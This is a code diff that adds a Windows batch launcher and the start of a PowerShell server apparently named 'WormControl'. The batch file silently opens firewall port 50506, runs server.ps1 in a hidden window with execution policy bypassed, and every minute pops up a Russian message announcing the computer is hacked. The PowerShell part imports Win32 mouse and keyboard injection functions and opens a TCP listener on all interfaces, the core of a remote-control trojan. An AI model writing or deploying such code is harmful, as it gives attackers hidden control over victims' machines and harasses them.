@@ -1,2 +1,31 @@
-Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
-.\server.ps1
+@echo off
+setlocal
+
+netsh advfirewall firewall add rule name="WC-IN" dir=in action=allow protocol=TCP localport=50506 >nul 2>&1
+netsh advfirewall firewall add rule name="WC-OUT" dir=out action=allow protocol=TCP localport=50506 >nul 2>&1
+netsh advfirewall firewall add rule name="WC-IN-UDP" dir=in action=allow protocol=UDP localport=50506 >nul 2>&1
+
+start "" /min powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File "%~dp0server.ps1"
+
+:loop
+timeout /t 60 /nobreak >nul
+powershell -WindowStyle Hidden -NoProfile -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('ТВОЙ КОМПЬЮТЕР ВЗЛОМАН','WormControl')" >nul 2>&1
+goto loop
+
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+Add-Type -AssemblyName System.Core
+
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+public class Win32 {
+    [DllImport("user32.dll")] public static extern void mouse_event(int f,int x,int y,int d,int e);
+    [DllImport("user32.dll")] public static extern void keybd_event(byte vk, byte scan, int f, int e);
+    [DllImport("user32.dll")] public static extern bool SetCursorPos(int x, int y);
+}
+"@
+
+$port = 50506
+$listener = [System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any, $port)
+$listener.Start()
